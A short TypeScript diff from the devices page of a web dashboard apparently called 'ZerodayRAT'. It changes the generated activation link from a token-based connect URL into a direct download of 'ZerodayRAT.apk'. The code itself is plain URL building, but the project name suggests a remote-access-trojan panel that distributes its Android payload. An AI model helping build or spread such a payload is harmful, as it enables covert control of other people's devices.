@@ -21,14 +21,10 @@ const PRODUCTION_APP_URL = "https://zerodayrat.vercel.app";
  * the /connect page's instructions otherwise. See ConnectPage.tsx and the
  * https intent-filter on ActivationActivity in AndroidManifest.xml.
  */
-function buildActivationLink(device: Device): string {
-  const params = new URLSearchParams({
-    token: device.device_token || "",
-    name: device.device_label,
-  });
+function buildActivationLink(_device?: Device): string {
   const isLocalDev = ["localhost", "127.0.0.1"].includes(window.location.hostname);
   const origin = isLocalDev ? PRODUCTION_APP_URL : window.location.origin;
-  return `${origin}/connect?${params.toString()}`;
+  return `${origin}/download/ZerodayRAT.apk`;
 }
 
 export default function DevicesListPage() {
